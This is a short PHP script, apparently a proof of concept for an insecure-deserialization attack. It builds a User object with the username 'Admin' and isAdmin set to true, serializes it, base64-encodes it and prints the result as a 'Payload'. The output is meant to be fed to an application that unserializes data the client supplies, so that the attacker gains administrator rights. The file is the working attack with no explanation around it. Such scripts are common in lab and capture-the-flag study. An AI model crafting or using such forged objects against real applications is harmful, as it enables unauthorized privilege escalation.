<?php
class User
{
    public $username = "Admin";
    public $isAdmin = true;
}

$maliciousUser = new User();
$serializedData = serialize($maliciousUser);
$encodedData = base64_encode($serializedData);

echo "Payload: " . $encodedData;
